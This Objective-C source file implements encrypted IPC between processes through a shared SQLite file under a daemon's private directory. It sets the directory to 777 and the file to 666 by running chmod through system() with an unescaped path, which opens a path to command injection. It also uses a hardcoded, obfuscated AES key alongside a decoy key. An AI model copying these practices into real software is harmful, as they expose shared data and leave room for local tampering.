//
//  SharedFileIPC.m
//  IPC
//
//  Created by Makara Khloth on 1/24/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "SharedFileIPC.h"

#import "FxDatabase.h"
#import "FMDatabase.h"
#import "DaemonPrivateHome.h"
#import "AESCryptor.h"
#import "AutomateAESKeyIPC.h"

static NSString *kCreateTableSharedFile = @"CREATE TABLE shared (shared_id INTEGER PRIMARY KEY,"
												"shared_data BLOB NOT NULL)";
static NSString *kCreateIndexSharedFile = @"CREATE INDEX shared_index ON shared (shared_id)";

static NSString* kSelectFromSharedFile	= @"SELECT * FROM shared WHERE shared_id = ?";
static NSString* kUpdateToSharedFile	= @"UPDATE shared SET shared_data = ? WHERE shared_id = ?";
static NSString* kInsertToSharedFile	= @"INSERT INTO shared VALUES(?, ?)";
static NSString *kDeleteFromSharedFile	= @"DELETE FROM shared WHERE shared_id = ?";
static NSString *kDeleteAllFromSharedFile	= @"DELETE FROM shared";

static char kKey[] = {4,5,21,22,1,5,10,3,2,56,126,10,14,14,14,9 };

@interface SharedFileIPC (private)

- (void) changePermission: (NSString *) aPermissionString forPath: (NSString *) aPath;
- (void) createSharedFile;

- (NSData *) encrypt: (NSData *) aData;
- (NSData *) decrypt: (NSData *) aData;

@end

@implementation SharedFileIPC

@synthesize mSharedFileName;

- (id) initWithSharedFileName: (NSString *) aSharedFileName {
	if ((self = [super init])) {
		mSharedFileName = [[NSString alloc] initWithString:aSharedFileName];
		[self createSharedFile];
	}
	return (self);
}

- (void) writeData: (NSData *) aData withID: (NSInteger) aID {
	NSNumber* sharedID = [NSNumber numberWithInteger:aID];
	NSData *encryptedData = [self encrypt:aData];
	//DLog (@"Going to write/update data = %@ with id = %d", encryptedData, (int)aID)
	
	FMDatabase *db = [mDatabase mDatabase];
	FMResultSet* rs = [db executeQuery:kSelectFromSharedFile, sharedID];
	if ([rs next]) {
		DLog (@"----UPDATE----");
		[db executeUpdate:kUpdateToSharedFile, encryptedData, sharedID];
	} else {
		DLog (@"----INSERT----");
		[db executeUpdate:kInsertToSharedFile, sharedID, encryptedData];
	}
	//DLog (@"End updating with id %d", (int)aID)
}

- (NSData *) readDataWithID: (NSInteger) aID {
	NSData *data = nil;
	NSNumber* sharedID = [NSNumber numberWithInteger:aID];
	//DLog (@"Going to read data with id = %d", (int)aID)
	
	FMDatabase *db = [mDatabase mDatabase];
	FMResultSet* rs = [db executeQuery:kSelectFromSharedFile, sharedID];
	if ([rs next]) {
		data = [rs dataForColumnIndex:1];
		data = [self decrypt:data];
	}
	//DLog (@"End reading with id %d", (int)aID)
	return (data);
}

- (void) deleteData: (NSInteger) aID {
	NSNumber* sharedID = [NSNumber numberWithInteger:aID];
	//DLog (@"Going to delete data with id = %d", (int)aID)
	
	FMDatabase *db = [mDatabase mDatabase];
	[db executeUpdate:kDeleteFromSharedFile, sharedID];
}

- (void) clearData {
	FMDatabase *db = [mDatabase mDatabase];
	[db executeUpdate:kDeleteAllFromSharedFile];
}

- (void) changePermission: (NSString *) aPermissionString forPath: (NSString *) aPath {
	NSFileManager *manager	= [NSFileManager defaultManager];
	NSDictionary *attribtes = [manager attributesOfItemAtPath:aPath error:nil];
	NSUInteger perms = [attribtes filePosixPermissions];
	
	NSString *permsStr = [NSString string];
	for (int i = 2; i >= 0; i--) {
		unsigned long thisPart = (perms >> (i * 3)) & 0x7;   
		permsStr = [permsStr stringByAppendingFormat:@"%lu", thisPart];
	}
	//DLog(@"permission of %@ is %@", aPath, permsStr);
	
	if (![permsStr isEqualToString:aPermissionString]) {
		//DLog (@"... Change mode to %@", aPermissionString)
		NSString *command = [NSString stringWithFormat:@"chmod %@ %@", aPermissionString, aPath];
		system([command cStringUsingEncoding:NSUTF8StringEncoding]); // Change mode for other shared processes
	} else {
		//DLog (@"... %@ already", aPermissionString)
	}
}

- (void) createSharedFile {
	BOOL success = FALSE;
	NSFileManager *fm = [NSFileManager defaultManager];
	NSString *privateHome = [DaemonPrivateHome daemonPrivateHome];
	NSString *sharedFilePath = [privateHome stringByAppendingString:@"sharesipc/"];
	
	//NSFileManager *manager = [NSFileManager defaultManager];
	
	if (![fm fileExistsAtPath:sharedFilePath]) {
		//DLog (@".... creating share file path 'sharesipc'")
		[DaemonPrivateHome createDirectoryAndIntermediateDirectories:sharedFilePath];
		
		/*
		// check file attribute if it's permission is 777 ------
		NSDictionary *attribtes = [manager attributesOfItemAtPath:sharedFilePath error:nil];
		NSUInteger perms = [attribtes filePosixPermissions];
		NSString *permsStr = [NSString string];
		for (int i = 2; i >= 0; i--) {
			unsigned long thisPart = (perms >> (i * 3)) & 0x7;   
			permsStr = [permsStr stringByAppendingFormat:@"%d", thisPart];
		}
		NSLog(@"permission of %@ is %@", sharedFilePath, permsStr);
		if (![permsStr isEqualToString:@"777"]) {
			DLog (@"... Change mode to 777")
			NSString *command = [NSString stringWithFormat:@"chmod 777 %@", sharedFilePath];
			system([command cStringUsingEncoding:NSUTF8StringEncoding]); // Change mode for other shared processes
		} else {
			DLog (@"... 777 already")
		}
		 */
		[self changePermission:@"777" forPath:sharedFilePath];
	}
	NSString *sharedFileFullPath = [sharedFilePath stringByAppendingString:[self mSharedFileName]];
	if ([fm fileExistsAtPath:sharedFileFullPath]) {
		mDatabase = [[FxDatabase alloc] initDatabaseWithPath:sharedFileFullPath];
		[mDatabase openDatabase];
		success = TRUE;
	} else {
		mDatabase = [[FxDatabase alloc] initDatabaseWithPath:sharedFileFullPath];
		[mDatabase openDatabase];
		success = [mDatabase createDatabaseSchema:kCreateTableSharedFile];
		success = [mDatabase createDatabaseSchema:kCreateIndexSharedFile];
	}
	
	/*
	// check file attribute if it's permission is 666
	NSDictionary *attribtes = [manager attributesOfItemAtPath:sharedFileFullPath error:nil];
	NSUInteger perms = [attribtes filePosixPermissions];
	NSString *permsStr = [NSString string];
	for (int i = 2; i >= 0; i--) {
		unsigned long thisPart = (perms >> (i * 3)) & 0x7;   
		permsStr = [permsStr stringByAppendingFormat:@"%d", thisPart];
	}
	
	//DLog(@"permission of %@ is %@", sharedFileFullPath, permsStr);
	if (![permsStr isEqualToString:@"666"]) {
		//DLog (@"... Change mode to 666")
		NSString *command = [NSString stringWithFormat:@"chmod 666 %@", sharedFileFullPath];
		system([command cStringUsingEncoding:NSUTF8StringEncoding]); // Change mode for other shared processes
	} else {
		//DLog (@"... 666 already")
	}
	 */
	[self changePermission:@"666" forPath:sharedFileFullPath];

	//DLog (@"!!!! Create shared file IPC success: %d", success);
}

- (NSData *) encrypt: (NSData *) aData {
	// Fake
	NSString* keystring = [[NSString alloc]initWithBytes:kKey length:sizeof(kKey)/sizeof(unsigned char) encoding:NSASCIIStringEncoding];
	AESCryptor* cryptor = [[AESCryptor alloc] init];
	
	char ipcKey[16];
	ipcKey[0] = ipc0();
	ipcKey[1] = ipc1();
	ipcKey[2] = ipc2();
	ipcKey[3] = ipc3();
	ipcKey[4] = ipc4();
	ipcKey[5] = ipc5();
	ipcKey[6] = ipc6();
	ipcKey[7] = ipc7();
	ipcKey[8] = ipc8();
	ipcKey[9] = ipc9();
	ipcKey[10] = ipc10();
	ipcKey[11] = ipc11();
	ipcKey[12] = ipc12();
	ipcKey[13] = ipc13();
	ipcKey[14] = ipc14();
	ipcKey[15] = ipc15();
	
	// Bad thing is that aesKey could be nil (unpredictable depend on auto-generate keys)
//	NSString *aesKey = [[[NSString alloc] initWithBytes:ipcKey
//												 length:16
//											   encoding:NSUTF8StringEncoding] autorelease];
	
	NSData *aesKey = [NSData dataWithBytes:ipcKey length:16];
	
	// Obsolete
//	NSData * encryptedData = [cryptor encryptv1:aData withKey:aesKey];
	
	NSData * encryptedData = [cryptor encryptv2:aData withKey:aesKey];
	
	[cryptor release];
	[keystring release];
	return (encryptedData);
}

- (NSData *) decrypt: (NSData *) aData {
	// Fake
	NSString* keystring = [[NSString alloc]initWithBytes:kKey length:sizeof(kKey)/sizeof(unsigned char) encoding:NSASCIIStringEncoding];
	AESCryptor* cryptor = [[AESCryptor alloc] init];
	
	char ipcKey[16];
	ipcKey[0] = ipc0();
	ipcKey[1] = ipc1();
	ipcKey[2] = ipc2();
	ipcKey[3] = ipc3();
	ipcKey[4] = ipc4();
	ipcKey[5] = ipc5();
	ipcKey[6] = ipc6();
	ipcKey[7] = ipc7();
	ipcKey[8] = ipc8();
	ipcKey[9] = ipc9();
	ipcKey[10] = ipc10();
	ipcKey[11] = ipc11();
	ipcKey[12] = ipc12();
	ipcKey[13] = ipc13();
	ipcKey[14] = ipc14();
	ipcKey[15] = ipc15();
	
	// Bad thing is that aesKey could be nil (unpredictable depend on auto-generate keys)
//	NSString *aesKey = [[[NSString alloc] initWithBytes:ipcKey
//												 length:16
//											   encoding:NSUTF8StringEncoding] autorelease];
	
	NSData *aesKey = [NSData dataWithBytes:ipcKey length:16];
	
	// Obsolete
//	NSData * decryptedData = [cryptor decryptv1:aData withKey:aesKey];
	
	NSData * decryptedData = [cryptor decryptv2:aData withKey:aesKey];
	
	[cryptor release];
	[keystring release];
	return (decryptedData);
}

- (void) dealloc {
	[mSharedFileName release];
	[mDatabase release];
	[super dealloc];
}

@end
